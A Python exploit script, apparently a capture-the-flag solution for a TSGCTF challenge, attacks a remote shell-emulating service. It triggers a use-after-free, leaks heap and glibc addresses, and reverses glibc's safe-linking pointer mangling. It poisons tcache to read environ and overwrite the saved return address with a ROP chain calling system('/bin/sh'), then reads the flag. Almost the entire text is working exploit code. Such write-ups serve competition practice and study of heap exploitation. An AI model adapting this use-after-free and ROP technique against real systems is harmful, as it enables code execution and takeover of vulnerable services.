#!/bin/python3

from ptrlib import *
import random
import timeout_decorator

class TimeoutException(Exception):
    pass

@timeout_decorator.timeout(15, timeout_exception=TimeoutException)
def exploit(host: str, port: int):
    glibc = ELF("./libc-2.37.so")

    print(f"[-] connecting to {host}:{port}")
    prc = Socket(host, port, timeout=10)

    def invoke_uaf(num: int):
        c = random.randint(0, 10000)
        prc.sendlineafter(b"$ ", f"mkdir a{c}".encode())
        prc.sendlineafter(b"$ ", f"cd a{c}".encode())
        prc.sendlineafter(b"$ ", f"mkdir b{c}".encode())
        for i in range(num):
            prc.sendlineafter(b"$ ", f"touch file{i}".encode())
        prc.sendlineafter(b"$ ", f"cd /a{c}/b{c}".encode())
        prc.sendlineafter(b"$ ", b"cd /")
        prc.sendlineafter(b"$ ", f"rm a{c}".encode())
        prc.sendlineafter(b"$ ", f"cd /a{c}/b{c}".encode())
        prc.sendlineafter(b"$ ", b"cd ..")

    def protect_ptr(pos, ptr):
        return (pos >> 12) ^ ptr

    def decrypt(cipher):
        key = 0
        plain  = 0
        for i in range(1, 6):
            bits = 64 - 12 * i
            if bits < 0:
                bits = 0
            plain = ((cipher ^ key) >> bits) << bits
            key = plain >> 12
        return plain

    invoke_uaf(8)

    prc.sendlineafter(b"$ ", b"cat file1")
    file_offset = 0x130
    file_base_addr = decrypt(u64(prc.recvline())) - file_offset * 2
    print(f"[!] file base addr: {hex(file_base_addr)}")

    prc.sendlineafter(b"$ ", b"cat file0")
    leaked = u64(prc.recvline())

    if leaked < 0x7f0000000000:
        print(f"[!] failed to get a leak addr. retrying...")
        exploit(host, port)

    glibc.base = leaked - 0x1f6ce0
    print(f"[!] got the glibc base")

    environ_addr = glibc.symbol("environ")
    print(f"[!] environ addr: {hex(environ_addr)}")

    prc.sendlineafter(b"$ ", b"mod file6")
    cipher = protect_ptr(file_base_addr + file_offset * 6, environ_addr)
    prc.sendlineafter(b" > ", p64(cipher))
    print(f"[!] overwrote fd with {hex(cipher)}")

    prc.sendlineafter(b"$ ", b"cd /")
    for i in range(6):
        prc.sendlineafter(b"$ ", f"touch tmp0a{i}".encode())
    prc.sendlineafter(b"$ ", b"touch environ")
    prc.sendlineafter(b"$ ", b"cat environ")
    stack_environ = u64(prc.recvline())
    print(f"[!] environ: {hex(stack_environ)}")

    saved_rip_addr = stack_environ - 0x120
    print(f"[!] saved rip addr: {hex(saved_rip_addr)}")

    prc.sendlineafter(b"$ ", f"touch tmp1a0".encode())
    print(f"[!] consumed all freed heaps")

    invoke_uaf(2)

    prc.sendlineafter(b"$ ", b"cat file0")
    file_offset = 0x130
    file_base_addr = decrypt(u64(prc.recvline())) - file_offset
    print(f"[!] file base addr: {hex(file_base_addr)}")

    prc.sendlineafter(b"$ ", b"mod file0")
    cipher = protect_ptr(file_base_addr, saved_rip_addr - 0x8)
    prc.sendlineafter(b" > ", p64(cipher))
    print(f"[!] overwrote fd with {hex(cipher)}")

    prc.sendlineafter(b"$ ", b"cd /")
    prc.sendlineafter(b"$ ", b"touch tmp2a0")

    gadget1_addr = next(glibc.gadget("ret"))
    gadget2_addr = next(glibc.gadget("pop rdi; ret"))
    bin_sh_addr = next(glibc.find("/bin/sh"))
    system_addr = glibc.symbol("system")
    payload = p64(gadget1_addr) \
        + p64(gadget2_addr) \
        + p64(bin_sh_addr) \
        + p64(system_addr)

    prc.sendlineafter(b"$ ", b"touch rip")
    prc.sendlineafter(b"$ ", b"mod rip")
    prc.sendlineafter(b" > ", b"A" * 0x8 + payload)
    print(f"[!] overwrote saved rip")

    prc.sendlineafter(b"$ ", b"exit")

    print(f"[!] attack performed")

    prc.sendline("cat ./flag.txt")
    flag = str(prc.recvline())

    message = re.search("TSGCTF{.*}", flag)
    if message is not None:
        print(message.group(0))
        exit(0)
    else:
        raise Exception("failed to get the flag after finising exploit")

host = sys.argv[1]
port = int(sys.argv[2])

while True:
    try:
        exploit(host, port)
    except TimeoutException:
        print("[!] timeout. retrying...")
        continue
    except Exception as e:
        print(e)
        print("[!] Unknown error. retrying...")
        continue
